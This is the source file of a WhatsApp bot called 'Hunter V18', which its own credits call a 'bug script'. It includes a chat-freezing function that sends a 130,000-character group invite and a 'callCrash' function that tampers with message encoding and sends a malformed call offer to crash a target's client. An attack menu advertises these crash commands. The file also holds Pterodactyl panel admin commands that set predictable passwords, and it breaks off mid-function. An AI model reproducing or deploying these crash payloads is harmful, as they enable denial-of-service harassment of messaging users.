require('dotenv').config();
const chalk = require("chalk");
const os = require("os");
const { Octokit } = require("@octokit/rest");
const axios = require("axios");
const crypto  = require("crypto")
const { PANEL_DOMAIN, PANEL_API_KEY, GLOBAL_EGG, GLOBAL_LOCATION, BOT_SERVER_ID, config } = require('./config');
const fs = require('fs-extra');

const {
default: baileys,
proto,
jidNormalizedUser,
generateWAMessage,
generateWAMessageFromContent,
getContentType,
prepareWAMessageMedia,
} = require("@trashcore/baileys")

// GitHub DB - Using token from environment variable
const octokit = new Octokit({ 
    auth: process.env.GITHUB_TOKEN // Now using environment variable
});
const ownerNumber = process.env.BOT_OWNER; // BOT_OWNER=2547xxxxxx in .env

const xtravas = fs.readFileSync('./media/xtravas.jpg');
const christmas = fs.readFileSync('./media/christmas.jpg');

async function getDatabase() {
  try {
    // Check if GitHub credentials are configured
    if (!process.env.GITHUB_OWNER || !process.env.GITHUB_REPO || !process.env.GITHUB_TOKEN) {
      console.log(chalk.yellow("⚠️ GitHub credentials not configured. Using empty database."));
      return [];
    }
    
    const { data } = await octokit.repos.getContent({
      owner: process.env.GITHUB_OWNER,
      repo: process.env.GITHUB_REPO,
      path: "users.json"
    });
    const content = Buffer.from(data.content, "base64").toString();
    const parsed = JSON.parse(content);
    return Array.isArray(parsed) ? parsed : [];
  } catch (err) {
    console.error(chalk.redBright("❌ Failed to fetch DB from GitHub:"), err?.message || err);
    return [];
  }
}

function normalizeNumber(num) {
  if (!num) return "";
  return String(num).replace(/\D/g, "");
}
const { sleep, getBuffer } = require('./library/myfunc.js');
const { greetings } = require('./library/utils')

module.exports = async function handleCommand(command, m, trashcore, body) {
  try {
    const senderNumber = normalizeNumber(m._senderNumber || (m.key?.participant || m.key?.remoteJid || "").split("@")[0]);
    const botNumber = trashcore.user.id.split(":")[0]; 
    const isOwner = senderNumber === botNumber || senderNumber === normalizeNumber(process.env.BOT_OWNER); // Also check against BOT_OWNER env
    const pushName = m.pushName || "Unknown";
    const now = new Date();
    const timeEAT = now.toLocaleString("en-KE", { timeZone: "Africa/Nairobi" });
    const chatId = m.chat || m.key.remoteJid; 
    const args = body.trim().split(/ +/).slice(1);
    const q = args.join(" ").trim();
    
    const isGroup = chatId.endsWith("@g.us");
    let groupName = "Private Chat";

    if (isGroup) {
      const groupMeta = await trashcore.groupMetadata(chatId).catch(() => ({ subject: "Unknown Group" }));
      groupName = groupMeta.subject;

      console.log(chalk.bgGreen.black("\n📩 New group message"));
      console.log(chalk.bgGreen.black("Group:"), groupName);
      console.log(chalk.bgGreen.black("Sender:"), pushName);
      console.log(chalk.bgGreen.black("Number (participant):"), senderNumber);
      console.log(chalk.bgGreen.black("Time (EAT):"), timeEAT);
    } else {
      console.log(chalk.bgGreen.black("\n📩 New private message"));
      console.log(chalk.bgGreen.black("Sender:"), pushName);
      console.log(chalk.bgGreen.black("Number:"), senderNumber);
      console.log(chalk.bgGreen.black("Time (EAT):"), timeEAT);
    }

const qtext = {
key: {
fromMe: true,
participant: `0@s.whatsapp.net`,
...(chatId? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"extendedTextMessage": {
"text": `🖥️⟠ 𝐇𝐔𝐍𝐓𝐄𝐑 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々`,
"title": `⟠ 𝐇𝐔𝐍𝐓𝐄𝐑 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々`,
'jpegThumbnail': null,
}
}
}

const song = {
  key: {
    fromMe: true,
    participant: `0@s.whatsapp.net`,
    ...(chatId ? { remoteJid: chatId } : {})
  },
  message: {
    extendedTextMessage: {
      text: `🎶✨ Now Spinning on the Decks ✨🎶
🎵 Track: *Jingle Bell*  
⏱ Groove Length: *1:39*  
🎤 Voice of the Jingles: *Jingle*  
🔥 Feel the rhythm, ride the wave, let the beat take you away...`,
      title: `🎶 Now Playing`,
      jpegThumbnail: christmas 
    }
  }
};

function getLimits(type) {
    if (type === 'unli') return { memory: 0, cpu: 0, disk: 0 };
    const ram = parseInt(type.replace('gb', '')) * 1024;
    return { memory: ram, cpu: 50, disk: ram * 2 };
}

function formatUptime(seconds) {
  seconds = Number(seconds)
  const d = Math.floor(seconds / (3600 * 24))
  const h = Math.floor((seconds % (3600 * 24)) / 3600)
  const m = Math.floor((seconds % 3600) / 60)
  const s = Math.floor(seconds % 60)

  return `${d}d ${h}h ${m}m ${s}s`
}

async function freezechat(IsTarget, ptcp = false) {
  const msg = {
    groupInviteMessage: {
      groupName: "ཹ".repeat(130000),
      groupJid: '6285709664923-1627579259@g.us',
      inviteCode: 'h+64P9RhJDzgXSPf',
      inviteExpiration: '999',
      caption: `🩸⃟⃨〫⃰‣ ⁖𝐓𝐳𝐗 ‌𖣂︎‌ 𝐓›𝐞𝐚‌𝐦⃜'`,
      thumbnail: xtravas
    }
  };

  await trashcore.relayMessage(
    IsTarget,
    msg,
    ptcp
      ? {}
      : { participant: { jid: IsTarget } }
  );
}

async function callCrash(target, isVideo = false) {
  const { jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require("@trashcore/baileys");
  
  try {
    const devices = (
      await trashcore.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await trashcore.assertSessions(devices);

    const createMutex = () => {
      const locks = new Map();
      
      return {
        async mutex(key, fn) {
          while (locks.has(key)) {
            await locks.get(key);
          }
          
          const lock = Promise.resolve().then(() => fn());
          locks.set(key, lock);
          
          try {
            const result = await lock;
            return result;
          } finally {
            locks.delete(key);
          }
        }
      };
    };

    const mutexManager = createMutex();
    
    const appendBufferMarker = (buffer) => {
      const newBuffer = Buffer.alloc(buffer.length + 8);
      buffer.copy(newBuffer);
      newBuffer.fill(1, buffer.length);
      return newBuffer;
    };

    const originalCreateParticipantNodes = trashcore.createParticipantNodes?.bind(trashcore);
    const originalEncodeWAMessage = trashcore.encodeWAMessage?.bind(trashcore);

    trashcore.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
      if (!recipientJids.length) {
        return {
          nodes: [],
          shouldIncludeDeviceIdentity: false
        };
      }

      const processedMessage = await (trashcore.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      
      const messagePairs = Array.isArray(processedMessage) 
        ? processedMessage 
        : recipientJids.map(jid => ({ recipientJid: jid, message: processedMessage }));

      const { id: meId, lid: meLid } = trashcore.authState.creds.me;
      const localUser = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;

      const nodes = await Promise.all(
        messagePairs.map(async ({ recipientJid: jid, message: msg }) => {
          const { user: targetUser } = jidDecode(jid);
          const { user: ownUser } = jidDecode(meId);
          const isOwnUser = targetUser === ownUser || targetUser === localUser;
          const isSelf = jid === meId || jid === meLid;
          
          if (dsmMessage && isOwnUser && !isSelf) {
            msg = dsmMessage;
          }

          const encodedBytes = appendBufferMarker(
            originalEncodeWAMessage 
              ? originalEncodeWAMessage(msg) 
              : encodeWAMessage(msg)
          );

          return mutexManager.mutex(jid, async () => {
            const { type, ciphertext } = await trashcore.signalRepository.encryptMessage({ 
              jid, 
              data: encodedBytes 
            });
            
            if (type === 'pkmsg') {
              shouldIncludeDeviceIdentity = true;
            }
            
            return {
              tag: 'to',
              attrs: { jid },
              content: [{
                tag: 'enc',
                attrs: {
                  v: '2',
                  type,
                  ...extraAttrs
                },
                content: ciphertext
              }]
            };
          });
        })
      );

      return {
        nodes: nodes.filter(Boolean),
        shouldIncludeDeviceIdentity
      };
    };

    const callKey = crypto.randomBytes(32);
    const extendedCallKey = Buffer.concat([callKey, Buffer.alloc(8, 0x01)]);
    const callId = crypto.randomBytes(16).toString("hex").slice(0, 32).toUpperCase();

    const { nodes: destinations, shouldIncludeDeviceIdentity } = 
      await trashcore.createParticipantNodes(devices, { 
        conversation: "call-initiated"
      }, { count: '0' });

    const callStanza = {
      tag: "call",
      attrs: {
        to: target,
        id: trashcore.generateMessageTag(),
        from: trashcore.user.id
      },
      content: [{
        tag: "offer",
        attrs: {
          "call-id": callId,
          "call-creator": trashcore.user.id
        },
        content: [
          {
            tag: "audio",
            attrs: {
              enc: "opus",
              rate: "16000"
            }
          },
          {
            tag: "audio",
            attrs: {
              enc: "opus",
              rate: "8000"
            }
          },
          ...(isVideo ? [{
            tag: 'video',
            attrs: {
              enc: 'vp8',
              dec: 'vp8',
              orientation: '0',
              screen_width: '1920',
              screen_height: '1080',
              device_orientation: '0'
            }
          }] : []),
          {
            tag: "net",
            attrs: {
              medium: "3"
            }
          },
          {
            tag: "capability",
            attrs: { ver: "1" },
            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
          },
          {
            tag: "encopt",
            attrs: { keygen: "2" }
          },
          {
            tag: "destination",
            attrs: {},
            content: destinations
          },
          ...(shouldIncludeDeviceIdentity ? [{
            tag: "device-identity",
            attrs: {},
            content: encodeSignedDeviceIdentity(trashcore.authState.creds.account, true)
          }] : [])
        ].filter(Boolean)
      }]
    };

    await trashcore.sendNode(callStanza);

  } catch (error) {
    console.error('Error in callCrash:', error);
    throw error;
  }
}

    // Fetch database and check authorization
    const database = await getDatabase();
    const allowed = database.some(entry => normalizeNumber(entry.number) === senderNumber) || isOwner; // Allow owner even if not in DB
    console.log(chalk.bgGreen.black("DB users:"), database.map(u => u.number));
    console.log(chalk.bgGreen.black("Allowed:"), allowed);

    const reply = async (text) => {
      if (!chatId) return console.log("⚠️ chatId undefined, cannot reply");
      await trashcore.sendMessage(chatId, { text }, { quoted: m });
    };
    
    async function xreply(text) {
            trashcore.sendMessage(chatId, {
                text: text,
                contextInfo: {
                    mentionedJid: [senderNumber],
                    externalAdReply: {
                        title:"🖥️⟠ 𝐇𝐔𝐍𝐓𝐄𝐑-𝐂𝐋͢𝐢𝚵𝐍͢𝐓",
                        body:"made by trashcore",
                        thumbnailUrl: "https://files.catbox.moe/f07e8i.jpeg",
                        sourceUrl: "https://www.trashcorex.zone.id",
                        renderLargerThumbnail: false,
                    }
                }
            }, { quoted:qtext})
        }

    if (!allowed) {
      await xreply("❌ You are not authorized to use this bot!");
      return;
    }

    console.log(chalk.greenBright(`✅ Sender ${senderNumber} authorized. Running command: ${command}`));

    // --- Switch-case with break ---
    switch (command) {
      case "ping": {
  const ping = Date.now() - (m.messageTimestamp * 1000)
  const botUptime = formatUptime(process.uptime())
  const vpsUptime = formatUptime(require("os").uptime())

  const teks = `🏓 *HUNTER V18 SYSTEM STATUS*`

  const msg = {
    interactiveMessage: {
      title: teks,
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          limited_time_offer: {
            text: "🖥️⟠ 𝐇𝐔𝐍𝐓𝐄𝐑-𝐗𝐓",
            copy_code: `${ping} ms`,
            expiration_time: Date.now() * 999
          },
          bottom_sheet: {
            in_thread_buttons_limit: 1,
            divider_indices: [1, 2, 3, 4, 5, 999],
            list_title: "𝐒𝐘𝐒𝐓𝐄𝐌 𝐒𝐓𝐀𝐓𝐔𝐒",
            button_title: "VIEW DETAILS"
          }
        }),
        buttons: [
          {
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({
              flow_cta: "╭───「 STATUS 」",
              icon: "DEFAULT",
              flow_message_version: "3",
              flow_id: "*menu"
            })
          },
          {
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({
              flow_cta: `│ ▢ Ping : ${ping} ms`,
              icon: "REVIEW",
              flow_message_version: "3",
              flow_id: ".ping"
            })
          },
          {
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({
              flow_cta: `│ ▢ Bot Uptime : ${botUptime}`,
              icon: "DOCUMENT",
              flow_message_version: "3",
              flow_id: "*menu"
            })
          },
          {
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({
              flow_cta: `│ ▢ VPS Uptime : ${vpsUptime}`,
              icon: "PROMOTION",
              flow_message_version: "3",
              flow_id: "*menu"
            })
          },
          {
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({
              flow_cta: "╰──────────⊱",
              icon: "DEFAULT",
              flow_message_version: "3",
              flow_id: "*menu"
            })
          }
        ]
      }
    }
  }

  await trashcore.sendMessage(chatId, msg, { quoted: m })
}
break
            
case "mencu": {
    await trashcore.sendMessage(chatId, { react: { text: `🧙‍♂️`, key: m.key } });

    const date = new Date().toLocaleString("en-KE", { timeZone: "Africa/Nairobi" });
    const creator = "Trashcore Devs"; 
    const database = false;

    const uptimeSeconds = process.uptime();
    const uptime = `${Math.floor(uptimeSeconds / 3600)}h ${Math.floor((uptimeSeconds % 3600) / 60)}m`;

    const stats = `*INFO*
> *Date:* ${date}
> *Creator:* ${creator}
> *Database:* ${database ? "False" : "True"}
> *Uptime:* ${uptime}
`;

    const bugmenux = `${stats}
(🩸⃟‣𝐇𝐔𝐍𝐓𝐄𝐑-𝐕𝟏𝟖)
━━ *ᴜᴛɪʟɪᴛʏ*
> ⟩ .ᴍᴇɴᴜ
> ⟩ .ᴘɪɴɢ
> ⟩ .ᴏᴡɴᴇʀ
> ⟩ .ʟɪsᴛᴅᴀᴛᴀʙᴀsᴇ

━━ ᴀᴛᴛᴀᴄᴋ
> ▪ .ɪɴᴠɪsɪʙʟᴇ
> ▪ .xꜱϙʟ
> ▪ .ᴠᴄᴀʀᴅᴄʀᴀsʜ
━━━━━━━━━
©Sĭ̈nc̆̈ĕ̈ 2023##£
`;

    let menuMessage = {
        image: { url: "https://files.catbox.moe/g8p4r6.jpeg" },
        caption: bugmenux,
        footer: "©Sĭ̈nc̆̈ĕ̈ 2024##£",
        headerType: 6,
        contextInfo: {
            externalAdReply: {
                title: "🖥️⟠ 𝐇𝐔𝐍𝐓𝐄𝐑-𝐂𝐋͢𝐢𝚵𝐍͢𝐓",
                body: "made by trashcore",
                thumbnailUrl: "https://files.catbox.moe/f07e8i.jpeg",
                sourceUrl: "https://www.trashcorex.zone.id",
                mediaType: 1,
                renderLargerThumbnail: false
            }
        }
    };

    await trashcore.sendMessage(chatId, menuMessage, { quoted: qtext });

    await trashcore.sendMessage(
      chatId,
      {
        audio: { url: "https://files.catbox.moe/ralkfa.mp3" },
        mimetype: "audio/mpeg",
        ptt: false
      },
      { quoted: m }
    );
}
break;

case 'menu': {
  // ===== UPTIME =====
  const uptimeMs = process.uptime() * 1000;
  const formatUptime = (ms) => {
    const s = Math.floor(ms / 1000);
    const h = Math.floor(s / 3600);
    const m = Math.floor((s % 3600) / 60);
    const sec = s % 60;
    return `${h}h ${m}m ${sec}s`;
  };

  const caption = `(🩸⃟‣𝐇𝐔𝐍𝐓𝐄𝐑-𝐕𝟏𝟖)
┃⭔ Owner   : t.me/trashcoredev
┃⭔ Bot     : Hunter
┃⭔ Version : 18.0.0
┃⭔ Baileys : @trashcore/baileys
┃⭔ Uptime  : ${formatUptime(uptimeMs)}`;

  // ===== MENU =====
  await trashcore.sendMessage(
    chatId,
    {
      interactiveMessage: {
        footer: caption,
        thumbnail: "https://files.catbox.moe/w388mh.jpeg",

        nativeFlowMessage: {
          messageParamsJson: JSON.stringify({
            bottom_sheet: {
              in_thread_buttons_limit: 2,
              list_title: "🥷 HUNTER V18 🤠",
              button_title: "Options"
            }
          }),

          buttons: [
            // ===== LIST MENU =====
            {
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                title: "✨ 𝐌𝐚𝐢𝐧 ☇ 𝐌𝐞𝐧𝐮 ✨",
                sections: [
                  {
                    title: "🌟 𝐌𝐚𝐢𝐧 𝐌𝐞𝐧𝐮 🌟",
                    rows: [
                      { 
                        title: "👤 𝐔𝐬𝐞𝐫 𝐌𝐞𝐧𝐮", 
                        description: "🛠️ Access user features & commands", 
                        id: "*xmenu" 
                      },
                      { 
                        title: "👑 𝐎𝐰𝐧𝐞𝐫", 
                        description: "🔧 Check if you are the bot owner", 
                        id: "*owner" 
                      }
                    ]
                  },
                  {
                    title: "⚙️ 𝐓𝐨𝐨𝐥𝐬 ⚙️",
                    rows: [
                      { 
                        title: "🐞 𝐁𝐮𝐠 𝐌𝐞𝐧𝐮", 
                        description: "Access the bug commands", 
                        id: "*bug" 
                      },
                      { 
                        title: "💻 𝐂𝐏𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮", 
                        description: "Access the CPanel commands", 
                        id: "*cpanel" 
                      }
                    ]
                  }
                ]
              })
            },
            {
              name: "quick_reply",
              buttonParamsJson: JSON.stringify({
                display_text: "👻 Ping",
                id: "*ping"
              })
            },
            {
              name: "quick_reply",
              buttonParamsJson: JSON.stringify({
                display_text: "👤 Owner",
                id: "*owner"
              })
            },
            {
              name: "quick_reply",
              buttonParamsJson: JSON.stringify({
                display_text: "🙏 Thanks To",
                id: "*credits"
              })
            }
          ]
        }
      }
    },
    { quoted: song }
  );

  // ===== AUDIO AFTER MENU =====
  await trashcore.sendMessage(
    chatId,
    {
      audio: { url: "https://files.catbox.moe/izwcrp.mp3" },
      mimetype: "audio/mpeg",
      fileName: "Menu Audio",
      ptt: false
    },
    { quoted: song } 
  );

  break;
}

/////////TQTO////////////////
case "credits": {
      const teks = `The Hunter V18 bug script development crew offers a great thanks delivery to the following friends without them this script is nothing`;
      const msg = {
        interactiveMessage: {
          title: teks, 
          image: fs.readFileSync('./media/credits.png'), 
          nativeFlowMessage: {
            messageParamsJson: JSON.stringify({
              limited_time_offer: {
                text: "🖥️⟠ 𝐇𝐔𝐍𝐓𝐄𝐑-𝐗𝐓",
                url: "t.me/trashcoredev",
                copy_code: "Tennor modz",
                expiration_time: Date.now() * 999
              },
              bottom_sheet: {
                in_thread_buttons_limit: 1,
                divider_indices: [1, 2, 3, 4, 5, 999],
                list_title: "𝐇𝐔𝐍𝐓𝐄𝐑-𝐕𝟏𝟖",
                button_title: "ViEw FRIENDS"
              }
            }),
            buttons: [
              {
                name: "galaxy_message", 
                buttonParamsJson: JSON.stringify({
                  flow_cta: "╭───「 The Crew」", 
                  icon: "DEFAULT", 
                  flow_message_version: "3", 
                  flow_id: "*menu"
                })
              }, 
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  flow_cta: "│ ▢ Trashcore", 
                  icon: "REVIEW", 
                  flow_message_version: "3", 
                  flow_id: ".menu"
                })
              }, 
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  flow_cta: "│ ▢ James Tech", 
                  icon: "DOCUMENT", 
                  flow_message_version: "3", 
                  flow_id: ".menu"
                })
              }, 
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  flow_cta: "│ ▢ Script users", 
                  icon: "PROMOTION", 
                  flow_message_version: "3", 
                  flow_id: "*menu"
                })
              }, 
              {
                name: "galaxy_message", 
                buttonParamsJson: JSON.stringify({
                  flow_cta: "╰──────────⊱", 
                  icon: "DEFAULT", 
                  flow_message_version: "3", 
                  flow_id: "*menu"
                })
              }
            ]
          }
        }
      };
  
      trashcore.sendMessage(chatId, msg, {
        quoted: qtext
      })
    }
    break;
/////////CPANELXBOT////////////////
case "xmenu": {
    const { generateWAMessageContent, generateWAMessageFromContent } = require("@trashcore/baileys");

    const start = Date.now();
    await trashcore.sendMessage(chatId, { react: { text: "👻", key: m.key } });
    const speed = Date.now() - start;

    const text = `(USER-𝐂𝐎𝐑𝐄S)
> ⟩ .ᴍᴇɴᴜ
> ⟩ .ᴘɪɴɢ
> ⟩ .ᴏᴡɴᴇʀ
> ⟩ .ʟɪsᴛᴅᴀᴛᴀʙᴀsᴇ
> ⟩ .ᴄʀᴇᴅɪᴛs`;

    // 🔹 Prepare image for interactive message
    const imageMsg = (
        await generateWAMessageContent(
            { image: { url: "https://files.catbox.moe/jim52k.jpg" } },
            { upload: trashcore.waUploadToServer }
        )
    ).imageMessage;

    const message = generateWAMessageFromContent(
        chatId,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: {
                        header: {
                            title: "🖥️⟠ 𝐇𝐔𝐍𝐓𝐄𝐑-𝐗𝐓",
                            hasMediaAttachment: true,
                            imageMessage: imageMsg
                        },
                        body: {
                            text: `${text}\n\n⚡ Speed : ${speed} ms`
                        },
                        footer: {
                            text: "©Sĭ̈nc̆̈ĕ̈ 2023##£"
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "cta_url",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "GET KEY",
                                        url: "https://www.trashcorex.zone.id/register"
                                    })
                                },
                                {
                                    name: "cta_url",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "CHAT DEV",
                                        url: "https://t.me/trashcoredev"
                                    })
                                }
                            ]
                        }
                    }
                }
            }
        },
        { quoted: qtext }
    );

    await trashcore.relayMessage(chatId, message.message, {
        messageId: message.key.id
    });
}
break;


case "cpanel": {
    const { generateWAMessageContent, generateWAMessageFromContent } = require("@trashcore/baileys");

    const start = Date.now();
    await trashcore.sendMessage(chatId, { react: { text: "👻", key: m.key } });
    const speed = Date.now() - start;

    const text = `(CPANEL-𝐂𝐎𝐑𝐄S)
> ▪ .ᴄʀᴇᴀᴛᴇsᴇʀᴠᴇʀ
> ▪ .ᴄʀᴇᴀᴛᴇᴜsᴇʀ
> ▪ .ᴀᴅᴅsᴇʀᴠᴇʀ
> ▪ .ᴄᴀᴅᴍɪɴᴘᴀɴᴇʟ
> ▪ .ʟɪsᴛsᴇʀᴠᴇʀs
> ▪ .ʟɪsᴛᴜsᴇʀs
> ▪ .ʟɪsᴛᴘᴀɴᴇʟᴀᴅᴍɪɴs
> ▪ .ᴅᴇʟsᴇʀᴠᴇʀ
> ▪ .ᴅᴇʟᴜsᴇʀ`;

    // 🔹 Prepare image for interactive message
    const imageMsg = (
        await generateWAMessageContent(
            { image: { url: "https://files.catbox.moe/gd1b05.jpg" } },
            { upload: trashcore.waUploadToServer }
        )
    ).imageMessage;

    const message = generateWAMessageFromContent(
        chatId,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: {
                        header: {
                            title: "🖥️⟠ 𝐇𝐔𝐍𝐓𝐄𝐑-𝐗𝐓",
                            hasMediaAttachment: true,
                            imageMessage: imageMsg
                        },
                        body: {
                            text: `${text}\n\n⚡ Speed : ${speed} ms`
                        },
                        footer: {
                            text: "©Sĭ̈nc̆̈ĕ̈ 2023##£"
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "cta_url",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "VIA TELEGRAM",
                                        url: "t.me/TrashcpanelBot"
                                    })
                                },
                                {
                                    name: "cta_url",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "CHAT DEV",
                                        url: "https://t.me/trashcoredev"
                                    })
                                }
                            ]
                        }
                    }
                }
            }
        },
        { quoted: qtext }
    );

    await trashcore.relayMessage(chatId, message.message, {
        messageId: message.key.id
    });
}
break;

////////ATTACKS////////////////
case "bug": {
    const { generateWAMessageContent, generateWAMessageFromContent } = require("@trashcore/baileys");

    const start = Date.now();
    await trashcore.sendMessage(chatId, { react: { text: "👾", key: m.key } });
    const speed = Date.now() - start;

    const text = `(ATTACK-𝐂𝐎𝐑𝐄S)
> ▪ .ɪɴᴠɪsɪʙʟᴇ
> ▪ .xꜱϙʟ
> ▪ .ᴠᴄᴀʀᴅᴄʀᴀsʜ
> ▪ .ꜰᴏʀᴄᴇ-ᴅᴇʟᴀʏ
> ▪ .ɢʀᴇᴇᴛ-ɢʀᴏᴜᴘ`;

    // 🔹 Prepare image for interactive message
    const imageMsg = (
        await generateWAMessageContent(
            { image: { url: "https://files.catbox.moe/c1hekv.png" } },
            { upload: trashcore.waUploadToServer }
        )
    ).imageMessage;

    const message = generateWAMessageFromContent(
        chatId,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: {
                        header: {
                            title: "🖥️⟠ 𝐇𝐔𝐍𝐓𝐄𝐑-𝐗𝐓",
                            hasMediaAttachment: true,
                            imageMessage: imageMsg
                        },
                        body: {
                            text: `${text}\n\n⚡ Speed : ${speed} ms`
                        },
                        footer: {
                            text: "©Sĭ̈nc̆̈ĕ̈ 2023##£"
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "cta_url",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "GET SCRIPT",
                                        url: "https://www.trashcorex.zone.id/hunter"
                                    })
                                },
                                {
                                    name: "cta_url",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "CHAT DEV",
                                        url: "https://t.me/trashcoredev"
                                    })
                                }
                            ]
                        }
                    }
                }
            }
        },
        { quoted: qtext }
    );

    await trashcore.relayMessage(chatId, message.message, {
        messageId: message.key.id
    });
}
break;

////////LIST SERVERS////////////////
case "listservers": {
    if (!isOwner) {
        return trashcore.sendMessage(
            chatId,
            { text: "❌ You are not authorized to use this command." },
            { quoted: m }
        );
    }

    try {
        // 🌐 Fetch servers from Pterodactyl
        const res = await fetch(`${PANEL_DOMAIN}/api/application/servers`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${PANEL_API_KEY}`
            }
        });

        const data = await res.json();

        if (data.errors) {
            return trashcore.sendMessage(
                chatId,
                { text: `❌ ${data.errors[0].detail || "Failed to fetch servers."}` },
                { quoted: m }
            );
        }

        const servers = data.data;
        if (!servers || servers.length === 0) {
            return trashcore.sendMessage(
                chatId,
                { text: "📭 No servers found." },
                { quoted: m }
            );
        }

        // 🧾 Format message
        let message = `📋 *LIST OF SERVERS*\n\n`;

        servers.forEach((server, index) => {
            const attr = server.attributes;
            message +=
`🖥️ *Server ${index + 1}*
• Name : ${attr.name}
• User ID : ${attr.user}
• Status : ${attr.status ?? "unknown"}
• RAM : ${attr.limits.memory === 0 ? "Unlimited" : attr.limits.memory + " MB"}
• CPU : ${attr.limits.cpu === 0 ? "Unlimited" : attr.limits.cpu + "%"}
• Disk : ${attr.limits.disk === 0 ? "Unlimited" : attr.limits.disk + " MB"}

`;
        });

        await trashcore.sendMessage(
            chatId,
            { text: message },
            { quoted: m }
        );

    } catch (err) {
        await trashcore.sendMessage(
            chatId,
            { text: `❌ Error: ${err.message}` },
            { quoted: m }
        );
    }
}
break;
////////LIST USERS////////////////
case "listusers": {
    // 🔒 Admin check
    if (!isOwner) {
        return xreply("❌ You are not authorized to use this command.");
    }

    try {
        const res = await fetch(`${PANEL_DOMAIN}/api/application/users`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${PANEL_API_KEY}`
            }
        });

        const data = await res.json();

        if (data.errors) {
            return reply("❌ " + JSON.stringify(data.errors[0]));
        }

        const users = data.data;
        if (!users || users.length === 0) {
            return xreply("⚠️ No users found.");
        }

        // 📋 Format message
        let message = `📋 *LIST OF USERS*\n\n`;

        users.forEach((user, i) => {
            const u = user.attributes;
            message +=
`⭔ *${i + 1}. ${u.username}*
▪ ID    : ${u.id}
▪ Email : ${u.email}

`;
        });

        await trashcore.sendMessage(
            chatId,
            { text: message },
            { quoted: m }
        );

    } catch (err) {
        xreply("❌ Error: " + err.message);
    }
}
break;

///////LIST PANEL ADMIN////////////////
case "listpaneladmins": {
    if (!isOwner) {
        return xreply("❌ You are not authorized to view panel admins.");
    }

    try {
        const res = await fetch(`${PANEL_DOMAIN}/api/application/users`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                Authorization: `Bearer ${PANEL_API_KEY}`
            }
        });

        const data = await res.json();

        if (!data || !data.data) {
            return reply("❌ Failed to fetch users data.");
        }

        // Filter root admins
        const admins = data.data.filter(
            u => u.attributes?.root_admin === true
        );

        if (admins.length === 0) {
            return xreply("⚠ No panel admins found.");
        }

        let text = `👑 *PTERODACTYL PANEL ADMINS*\n\n`;

        admins.forEach((admin, i) => {
            const u = admin.attributes;
            text += `*${i + 1}.* ${u.username}\n`;
            text += `📧 Email : ${u.email}\n`;
            text += `🆔 ID    : ${u.id}\n`;
            text += `───────────────\n`;
        });

        await trashcore.sendMessage(
            chatId,
            { text },
            { quoted: m }
        );

    } catch (err) {
        console.error(err);
        xreply("❌ Error fetching panel admins:\n" + err.message);
    }
}
break;
////////CREATE USER////////////////
case "createuser": {
    if (!isOwner) {
        return xreply("❌ You are not authorized to use this command.");
    }

    if (!q || !q.includes(",")) {
        return xreply(
            "❌ Invalid format.\n\n" +
            "Use:\n" +
            ".createuser username,email"
        );
    }

    const fetch = require("node-fetch");
    const { PANEL_DOMAIN, PANEL_API_KEY } = require("./config");

    const [username, email] = q.split(",").map(v => v.trim());

    if (!username || !email) {
        return xreply("❌ Username or email is missing.");
    }

    const password = `${username}001`;

    try {
        const res = await fetch(`${PANEL_DOMAIN}/api/application/users`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + PANEL_API_KEY
            },
            body: JSON.stringify({
                email,
                username,
                first_name: username,
                last_name: "User",
                language: "en",
                password,
                root_admin: false
            })
        });

        const data = await res.json();

        if (data.errors) {
            return reply("❌ " + data.errors[0].detail);
        }

        const user = data.attributes;

        const msg = `
✅ *PANEL USER CREATED*

👤 *Username:* ${user.username}
📧 *Email:* ${user.email}
🔐 *Password:* ${password}
🆔 *User ID:* ${user.id}

🔗 *Panel:* ${PANEL_DOMAIN}

⚠️ _User should change password after login._
        `.trim();

        await reply(msg);

    } catch (err) {
        reply("❌ Error: " + err.message);
    }
}
break;
/////////DEL USER////////////////
case "deluser": {
    if (!isOwner) {
        return xreply("❌ You are not authorized to use this command.");
    }

    if (!args[0]) {
        return xreply("❌ Usage:\n.deluser <username | userID>");
    }

    const usernameOrId = args[0];

    try {
        // Fetch all panel users
